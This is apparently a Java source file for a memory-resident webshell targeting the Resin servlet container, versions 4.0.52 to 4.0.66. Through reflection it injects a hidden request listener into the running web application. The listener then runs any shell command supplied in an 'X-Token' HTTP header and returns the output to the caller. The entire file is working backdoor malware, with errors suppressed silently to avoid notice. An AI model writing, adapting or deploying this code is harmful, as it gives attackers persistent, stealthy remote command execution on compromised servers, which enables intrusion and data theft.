package org.example.memshell;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

/**
 * @author Whoopsunix
 *
 * Version test
 * [4.0.52, 4.0.66]
 */
public class ResinListenerExecMS implements ServletRequestListener {
    private static String header = "X-Token";

    static {
        try {
            ResinListenerExecMS resinListenerExecMS = new ResinListenerExecMS();

            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

            for (int i = 0; i < threads.length; i++) {
                try {
                    Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                    Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                    Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

                    if (isInject(webapp, resinListenerExecMS.getClass().getName())) {
                        break;
                    }

                    inject(webapp, resinListenerExecMS);

                }catch (Exception e){

                }
            }
        } catch (Exception e) {

        }
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
            String cmd = httpServletRequest.getHeader(header);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            HttpServletResponse response = getResponse(httpServletRequest);
            response.getWriter().println(result);
        } catch (Exception e) {
        }

    }

    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    public static boolean isInject(Object webapp, String className) {
        try {
            ArrayList _requestListeners = (ArrayList) getFieldValue(webapp, "_requestListeners");
            for (int j = 0; j < _requestListeners.size(); j++) {
                if (_requestListeners.get(j).getClass().getName().equals(className)) {
//                _requestListeners.remove(j);
                    return true;
                }
            }
        } catch (Exception e) {

        }
        return false;
    }

    public static void inject(Object webapp, Object object) {
        try {
            Method method = webapp.getClass().getDeclaredMethod("addListenerObject", new Class[]{Object.class, Boolean.TYPE});
            method.setAccessible(true);
            method.invoke(webapp, object, true);
            webapp.getClass().getDeclaredMethod("clearCache").invoke(webapp);
        }catch (Exception e){

        }
    }

    public HttpServletResponse getResponse(Object httpServletRequest) {
        HttpServletResponse httpServletResponse = null;
        try{
            httpServletResponse = (HttpServletResponse) getFieldValue(httpServletRequest, "_response");
        }catch (Exception e){

        }
        return httpServletResponse;
    }




    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
